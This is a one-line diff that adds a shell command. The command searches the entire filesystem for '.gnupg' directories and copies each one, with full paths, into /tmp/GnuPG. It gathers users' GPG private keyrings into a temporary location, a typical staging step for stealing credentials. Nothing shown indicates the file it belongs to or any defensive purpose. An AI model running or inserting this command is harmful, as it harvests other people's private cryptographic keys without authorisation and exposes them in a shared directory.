@@ -1,0 +1,1 @@
+find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
